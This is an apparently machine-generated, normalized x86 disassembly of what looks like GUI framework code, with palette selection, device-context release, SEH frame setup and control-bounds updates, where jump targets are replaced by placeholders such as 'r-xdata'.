cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_435f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d0b4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413840
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d058
test al al
je r-xdata
sub_435e2c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_435f00
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cc18
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_435e58
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d238
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41d23c
mov eax [ ebp - 0x4 ]
call sub_435f4c
mov eax [ rw-data ]
call sub_413bac
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4136e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
call sub_435cc4
sub_435f00
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d23c
mov edx ebx
mov eax [ rw-data ]
call sub_413bc0
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_435f4c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43799c
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_435f78
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_435fb4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413ec8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_435ffc
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4360b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43618c
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403430
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_446828
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a20
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403fc0
sub_4361a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4438f4
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_437358
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x64 ]
pop eax
call sub_404378
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436216
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov al 0x1
sub_43621c
push ebx
mov ebx eax
mov eax ebx
call sub_44391c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_436250
push ebx
mov ebx eax
mov eax ebx
call sub_44396c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404378
je r-xdata
mov al 0x1
pop ebx
retn
sub_436288
push ebx
mov ebx eax
mov eax ebx
call sub_4439a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4362bc
push ebx
mov ebx eax
mov eax ebx
call sub_419ae4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4362e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_437388
sub_436304
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_436324
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403fc0
sub_436348
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_437278
sub_436368
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_436394
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404378
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_4363f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_436cd4
sub_436418
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_436cc0
sub_436438
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_436458
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4191e0
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c064
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_437408
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_435f78
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4382cc
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_436530
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035a8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_455c38
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
push edi
xor ecx ecx
mov edx 0xb039
call sub_43850c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_436cf8
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403430
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403234
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403234
mov eax [ edi + 0x68 ]
call sub_403234
mov eax [ edi + 0x64 ]
call sub_408590
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41922c
test bl bl
jle r-xdata
sub_4365fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_436624
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403430
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4366ac
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4369ac
sub_4366cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403234
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_439328
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403430
mov edx ebx
mov eax edi
call sub_4192b0
mov eax ebx
mov si 0xffd9
call sub_403430
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_436794
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419640
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43850c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43850c
sub_436828
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4194fc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_437310
jmp r-xdata
xor edx edx
mov eax esi
call sub_4366cc
sub_43686c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403430
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4366ac
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403430
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_436914
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_438a9c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4377a0
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4369ac
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43850c
mov eax ebx
mov si 0xffd0
call sub_403430
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403430
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4369ac
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_436ac8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_436aec
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_436b14
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_436b38
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_436b5c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403430
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c5e
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413984
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403430
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403430
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4136e4
sub_436c68
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4377a0
mov edx edi
mov eax ebx
call sub_436d18
mov edx edi
mov eax ebx
call sub_4385b0
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_436cd4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_436d18
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_436d74
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_436da0
mov edx eax
mov ecx esp
mov eax esi
call sub_4123e4
mov edx esp
mov eax ebx
call sub_4371e4
pop ecx
pop edx
pop esi
pop ebx
retn
sub_436db8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_436d5c
mov ecx esp
mov edx esi
call sub_4123e4
mov edx esp
mov eax ebx
call sub_4371e4
pop ecx
pop edx
pop esi
pop ebx
retn
sub_436de0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e68
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
sub_436e70
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_436e9c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_436ec8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45218c
sub_436ef8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
